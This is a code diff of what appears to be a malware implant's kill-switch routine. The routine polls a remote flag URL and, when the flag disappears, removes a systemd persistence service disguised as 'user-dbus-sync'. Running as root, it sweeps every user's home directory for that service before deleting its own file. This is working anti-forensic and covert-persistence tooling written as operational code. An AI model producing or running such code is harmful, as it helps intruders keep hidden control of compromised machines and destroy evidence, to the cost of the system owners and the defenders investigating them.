@@ -28,49 +28,70 @@ def kill_switch_loop():
         time.sleep(60) 
 
 def check_kill_switch():
-    import requests
+    import urllib.request
+    import urllib.error
     import subprocess
-    print("checking kill switch...")
+    import glob
+    print("[*] Checking kill switch...")
+    
     try:
+        # 1. Use built-in urllib to avoid 'requests' dependency errors in the root process
         unique_url = f"{BASE_FLAG_URL}?nocache={time.time()}"
-        response = requests.head(unique_url)
+        req = urllib.request.Request(unique_url, method="HEAD")
         
-        if response.status_code == 404:
-            print("Flag not found (404)! Initiating self-destruct...")
-            
-            # 1. Clean up persistence files
-            systemd_user_dir = os.path.expanduser("~/.config/systemd/user")
-            service_name = "user-dbus-sync"
-            
-            try:
-                # Stop and disable the timer/service
+        try:
+            with urllib.request.urlopen(req) as response:
+                return False  # Status 200 OK: Flag still exists (or is still cached)
+                
+        except urllib.error.HTTPError as e:
+            # If the HTTP error is exactly a 404
+            if e.code == 404:
+                print("[!] Flag not found (404)! Initiating self-destruct...")
+                
+                # 2. Clean up persistence files aggressively
+                service_name = "user-dbus-sync"
+                
+                # Check current user home + all /home/ directories if running as root
+                target_dirs = [os.path.expanduser("~/.config/systemd/user")]
+                if os.geteuid() == 0:
+                    target_dirs.extend(glob.glob("/home/*/.config/systemd/user"))
+                    
+                for d in target_dirs:
+                    try:
+                        svc_path = os.path.join(d, f"{service_name}.service")
+                        tmr_path = os.path.join(d, f"{service_name}.timer")
+                        if os.path.exists(svc_path): os.remove(svc_path)
+                        if os.path.exists(tmr_path): os.remove(tmr_path)
+                    except Exception:
+                        pass # Ignore errors for directories we don't own
+
+                # Try to stop the timer locally to kill the active daemon memory
                 subprocess.run(
-                    ["systemctl", "--user", "disable", "--now", f"{service_name}.timer", f"{service_name}.service"],
+                    ["systemctl", "--user", "stop", f"{service_name}.timer"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                 )
-                # Remove the files
-                os.remove(os.path.join(systemd_user_dir, f"{service_name}.service"))
-                os.remove(os.path.join(systemd_user_dir, f"{service_name}.timer"))
-                # Reload daemon
-                subprocess.run(["systemctl", "--user", "daemon-reload"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                print("[*] Persistence mechanisms removed.")
-            except Exception as e:
-                print(f"[-] Could not remove persistence: {e}")
+                subprocess.run(
+                    ["systemctl", "--user", "daemon-reload"], 
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+                )
+                print("[*] Persistence mechanisms scrubbed.")
 
-            # 2. Delete the script itself
-            f = __file__
-            try:
-                os.remove(f)
-                print(f"[*] Deleted {f}")
-            except Exception as e:
-                print(f"[-] Could not delete {f}: {e}")
+                # 3. Delete the script itself using the absolute global path
+                try:
+                    if os.path.exists(THIS_FILE):
+                        os.remove(THIS_FILE)
+                        print(f"[*] Deleted {THIS_FILE}")
+                except Exception as del_e:
+                    print(f"[-] Could not delete {THIS_FILE}: {del_e}")
+                    
+                return True 
                 
-            return True 
-        
-        return False
+            else:
+                # Other HTTP errors (403, 500, etc.)
+                return False
 
     except Exception as e:
-        print(f"Connection error: {e}")
+        print(f"[-] Connection error during killswitch check: {e}")
         return False
 
 def ensure_requests():
